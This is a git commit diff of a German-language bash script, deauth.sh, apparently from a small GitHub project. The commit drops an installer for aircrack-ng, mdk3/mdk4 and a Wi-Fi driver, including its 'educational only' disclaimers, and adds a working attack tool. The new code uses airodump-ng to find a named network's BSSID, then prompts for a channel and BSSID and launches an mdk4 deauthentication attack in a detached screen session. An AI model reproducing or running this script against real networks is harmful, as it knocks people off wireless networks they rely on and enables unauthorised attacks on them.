418b646789e0bb9c472b769a1de1835a190a82f4
TakkosTakko <90936936+TakkosTakko@users.noreply.github.com>
2023-07-06 17:45:16 +0200

    Add files via upload
    fixed some things

--- deauth.sh
+++ deauth.sh
@@ -1,71 +1,52 @@
 #!/bin/bash
 
-# Begrüßung
-echo "Willkommen zum Autoinstaller zum DeAuthen von WPA2/WPA3 Netzwerken!"
-echo "JUST for Educational things donst use it for cracking its illegal"
-echo "JUST for Educational things donst use it for cracking its illegal"
-echo "JUST for Educational things donst use it for cracking its illegal"
-echo "JUST for Educational things donst use it for cracking its illegal"
-echo "JUST for Educational things donst use it for cracking its illegal"
-echo " "
+function get_bssid {
+    local interface=$1
+    local essid=$2
 
-echo "  _____                     _   _                                                                                "
-echo " |  __ \         /\        | | | |                                                                               "
-echo " | |  | | ___   /  \  _   _| |_| |__                                                                            "
-echo " | |  | |/ _ \ / /\ \| | | | __| '_ \                                                                           "
-echo " | |__| |  __// ____ \ |_| | |_| | | |                                                                          "
-echo " |_____/ \___/_/  _ \_\__,_|\__|_| |_|   _               _             ______     _ _  __           _    _       "
-echo " |_   _|         | |      | | |     | | (_)             | |           |  ____|   (_) |/ /          | |  (_)      "
-echo "   | |  _ __  ___| |_ __ _| | | __ _| |_ _  ___  _ __   | |__  _   _  | |____   ___| ' / ___   ___ | | ___  ___  "
-echo "   | | | '_ \/ __| __/ _` I I I/ _` | __| |/ _ \| '_ \  | '_ \| | | | |  __\ \ / / |  < / _ \ / _ \| |/ / |/ _ \ "
-echo "  _| |_| | | \__ \ || (_| | | | (_| | |_| | (_) | | | | | |_) | |_| | | |___\ V /| | . \ (_) | (_) |   <| |  __/ "
-echo " |_____|_| |_|___/\__\__,_|_|_|\__,_|\__|_|\___/|_| |_| |_.__/ \__, | |______\_/ |_|_|\_\___/ \___/|_|\_\_|\___|" 
-echo "                                                          __/ |                                            "
-echo "                                                         |___/                                             "
+    airodump-ng "$interface" --essid "$essid" --output-format csv -w output
 
-# Abfrage, ob der Code ausgeführt werden soll
-read -p "Möchtest du die Installation ausführen? (ja/nein): " execute
+    local bssid=$(tail -n 1 output-01.csv | cut -d ',' -f 1)
 
-# Überprüfen der Benutzereingabe
-if [[ "$execute" == "ja" ]]; then
-    echo "Installation wird ausgeführt..."
+    echo "Die BSSID für ESSID '$essid' ist: $bssid"
 
-    echo "Anmeldung als root" 
-	sudo su -i root   
-	
-	#Installieren des Dependencies
-    echo "Installation von den Dependencies"
-	sudo apt install autoconf automake libpcre3-dev libnl-3-dev libsqlite3-dev libssl-dev ethtool build-essential g++ libnl-genl-3-dev libgcrypt20-dev libtool python3-distutils
-    sudo apt install -y pkg-config
+    rm output-01.csv output-01.kismet.csv
+}
 
-    # Installation der benötigten Pakete
-    echo "Updaten des Servers"
-    sudo apt-get update && apt-get upgrade -y
-    
-    echo "Installieren von aircrack-ng"
-    sudo apt-get install -y aircrack-ng
-    apt install git
-    git clone https://github.com/aircrack-ng/aircrack-ng.git
-    cd aircrack-ng
-    sudo autoreconf -i
-    sudo ./configure --with-experimental --with-ext-scripts 
-    sudo make 
-    sudo make install
-    sudo airodump-ng-oui-update
-    # Installation der mdk4 && mdk3 packets
-    echo "Installieren von mdk4 && mdk3"
-    sudo apt-get install -y mdk4 mdk3
+function perform_deauth {
+    local channel=$1
+    local bssid=$2
 
-    echo "Installieren von Netzwerktreiber (RTL8812AU)"
-    sudo apt-get install dkms
-    git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au.git
-    cd rtl*
-    sudo make dkms_install
-    make && make install
-    sudo apt-get update
-    sudo apt-get install bc mokutil build-essential libelf-dev linux-headers-`uname -r`
+    screen -dmS deauth mdk4 wlan0 d -c "$channel" -B "$bssid"
 
-    echo "Installation abgeschlossen. Server muss neugestartet werden!"
-else
-    echo "Fehler beim Ausführen des Skripts, Skript wird beendet."
+    echo "Deauthentication-Angriff gestartet für BSSID '$bssid'."
+
+}
+
+while true; do
+    echo "Gib die ESSID ein:"
+    read essid
+
+    echo "Gib deine WLAN-Schnittstelle ein:"
+    read interface
+
+    get_bssid "$interface" "$essid"
+
+    read -p "Möchtest du ein weiteres Netzwerk auslesen? (ja/nein): " execute
+
+    if [[ "${execute,,}" != "ja" ]]; then
+        break
+    fi
+done
+
+read -p "Möchtest du ein Netzwerk angreifen? (ja/nein): " execute
+
+if [[ "${execute,,}" == "ja" ]]; then
+    echo "Gib den Channel an:"
+    read channel
+
+    echo "Gib die BSSID an:"
+    read bssid
+
+    perform_deauth "$channel" "$bssid"
 fi
